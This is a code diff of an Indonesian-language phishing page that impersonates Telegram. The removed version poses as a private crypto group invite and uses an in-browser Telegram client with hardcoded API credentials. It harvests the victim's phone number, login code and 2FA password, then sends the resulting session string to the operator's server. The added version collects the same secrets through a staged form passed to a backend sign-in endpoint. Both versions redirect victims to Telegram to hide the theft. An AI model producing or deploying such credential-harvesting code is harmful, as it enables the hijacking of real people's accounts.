@@ -3,114 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram: Join Group Chat</title>
+    <title>Telegram: Verifikasi Grup</title>
     <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #ebeef2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .tg-card { background: white; width: 90%; max-width: 360px; padding: 40px 20px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; position: relative; }
-        .group-img { width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #6ab2f2, #3390ec); margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; font-weight: bold; }
-        h2 { margin: 0 0 5px; font-size: 18px; color: #222; }
-        .members { color: #8a8a8a; font-size: 13px; margin-bottom: 20px; }
-        .description { color: #444; font-size: 14px; line-height: 1.4; margin-bottom: 25px; }
-        .btn-join { background: #3390ec; color: white; border: none; padding: 12px; width: 100%; border-radius: 25px; font-size: 16px; font-weight: 600; cursor: pointer; }
-        
-        #overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); border-radius: 15px; z-index: 10; flex-direction: column; justify-content: center; align-items: center; }
-        .spinner { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid #3390ec; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status-msg { font-size: 13px; color: #3390ec; font-weight: bold; }
+        body { font-family: -apple-system, sans-serif; background: #ebeef2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 360px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .logo { width: 70px; height: 70px; background: #3390ec; border-radius: 50%; margin: 0 auto 15px; color: white; line-height: 70px; font-size: 30px; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
+        input:focus { border-color: #3390ec; }
+        button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 25px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        .hidden { display: none; }
+        #status { font-size: 13px; color: #3390ec; margin-top: 15px; min-height: 1.2em; font-weight: 500; }
     </style>
 </head>
 <body>
+    <div class="card">
+        <div class="logo">T</div>
+        <h2 id="title">Verifikasi Akun</h2>
+        <p id="desc" style="font-size: 14px; color: #666;">Gunakan nomor HP yang terdaftar di Telegram</p>
 
-<div class="tg-card">
-    <div id="overlay">
-        <div class="spinner"></div>
-        <div id="status-msg">Menghubungkan...</div>
+        <div id="step-phone">
+            <input type="tel" id="phone" placeholder="+62812345678" required>
+            <button onclick="sendPhone()">Lanjutkan</button>
+        </div>
+
+        <div id="step-otp" class="hidden">
+            <input type="number" id="otp" placeholder="Kode OTP 5-digit" required>
+            <button onclick="sendOTP()">Verifikasi</button>
+        </div>
+
+        <div id="step-2fa" class="hidden">
+            <input type="password" id="password" placeholder="Password 2FA" required>
+            <button onclick="send2FA()">Masuk</button>
+        </div>
+
+        <p id="status"></p>
     </div>
-    
-    <div class="group-img">K</div>
-    <h2>Komunitas Crypto Indonesia</h2>
-    <div class="members">124,582 members</div>
-    <div class="description">Grup ini bersifat privat. Verifikasi akun Anda untuk bergabung secara otomatis.</div>
-    <button class="btn-join" id="btn-join">JOIN GROUP</button>
-</div>
 
-<script type="module">
-    import { TelegramClient } from 'https://cdn.jsdelivr.net/npm/telegram@2.22.2/+esm';
-    import { StringSession } from 'https://cdn.jsdelivr.net/npm/telegram@2.22.2/sessions/index.js/+esm';
+    <script>
+        let userPhone = "";
+        const statusEl = document.getElementById('status');
 
-    const apiId = 37391656; 
-    const apiHash = "12d6406aa09781891052538af2fa5848";
-
-    const btn = document.getElementById('btn-join');
-    const overlay = document.getElementById('overlay');
-    const statusMsg = document.getElementById('status-msg');
-
-    async function sendToServer(text) {
-        try {
-            await fetch('/api/send', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: text })
-            });
-        } catch (e) { console.error(e); }
-    }
-
-    btn.onclick = async () => {
-        overlay.style.display = 'flex';
-        statusMsg.innerText = "Membuka Jalur Aman...";
-        
-        const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
-            connectionRetries: 15,
-            useWSS: true,
-            deviceModel: "Android Vercel App",
-        });
-
-        try {
-            // Force connection
-            await client.connect();
-            statusMsg.innerText = "Sinkronisasi Berhasil...";
-
-            await client.start({
-                phoneNumber: async () => {
-                    overlay.style.display = 'none';
-                    const n = prompt("Nomor HP (+62...):");
-                    overlay.style.display = 'flex';
-                    return n;
-                },
-                phoneCode: async () => {
-                    overlay.style.display = 'none';
-                    const c = prompt("Kode OTP Telegram:");
-                    overlay.style.display = 'flex';
-                    return c;
-                },
-                password: async () => {
-                    overlay.style.display = 'none';
-                    const p = prompt("Password 2FA:");
-                    overlay.style.display = 'flex';
-                    return p;
-                },
-                onError: (err) => {
-                    sendToServer(`⚠️ Error: ${err.message}`);
-                    alert(err.message);
-                    location.reload();
-                }
-            });
-
-            const me = await client.getMe();
-            const session = client.session.save();
-            
-            await sendToServer(`🚀 *SUCCESS*\nUser: ${me.firstName}\nPhone: +${me.phone}\nSession: \`${session}\``);
-            
-            statusMsg.innerText = "Verifikasi Selesai!";
-            setTimeout(() => { window.location.href = "https://t.me/telegram"; }, 2000);
-
-        } catch (err) {
-            await sendToServer(`❌ Crash: ${err.message}`);
-            alert("Timeout. Gunakan VPN jika masih gagal.");
-            location.reload();
+        async function requestApi(action, body) {
+            try {
+                const res = await fetch(`/api/main?action=${action}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+                return await res.json();
+            } catch (e) {
+                return { success: false, error: "Koneksi ke server terputus." };
+            }
         }
-    };
-</script>
+
+        async function sendPhone() {
+            userPhone = document.getElementById('phone').value.replace(/\s/g, '');
+            if(!userPhone.startsWith('+')) return alert("Gunakan kode negara (misal: +62)");
+            
+            statusEl.innerText = "Meminta kode ke Telegram...";
+            const res = await requestApi('send_code', { phone: userPhone });
+            
+            if(res.success) {
+                document.getElementById('step-phone').classList.add('hidden');
+                document.getElementById('step-otp').classList.remove('hidden');
+                statusEl.innerText = "Kode dikirim via aplikasi Telegram.";
+            } else { alert("Error: " + res.error); statusEl.innerText = ""; }
+        }
+
+        async function sendOTP() {
+            const code = document.getElementById('otp').value;
+            statusEl.innerText = "Memverifikasi...";
+            const res = await requestApi('signin', { phone: userPhone, code: code });
+            
+            if(res.success) {
+                if(res.need_2fa) {
+                    document.getElementById('step-otp').classList.add('hidden');
+                    document.getElementById('step-2fa').classList.remove('hidden');
+                    statusEl.innerText = "Masukkan Password Verifikasi Dua Langkah.";
+                } else {
+                    statusEl.innerText = "Berhasil! Mengalihkan...";
+                    setTimeout(() => window.location.href = "https://t.me/telegram", 2000);
+                }
+            } else { alert(res.error); statusEl.innerText = ""; }
+        }
+
+        async function send2FA() {
+            const pass = document.getElementById('password').value;
+            statusEl.innerText = "Mengecek password...";
+            const res = await requestApi('signin', { phone: userPhone, password: pass });
+            if(res.success) {
+                statusEl.innerText = "Berhasil! Mengalihkan...";
+                setTimeout(() => window.location.href = "https://t.me/telegram", 2000);
+            } else { alert(res.error); statusEl.innerText = ""; }
+        }
+    </script>
 </body>
-  </html>
-  
+</html>
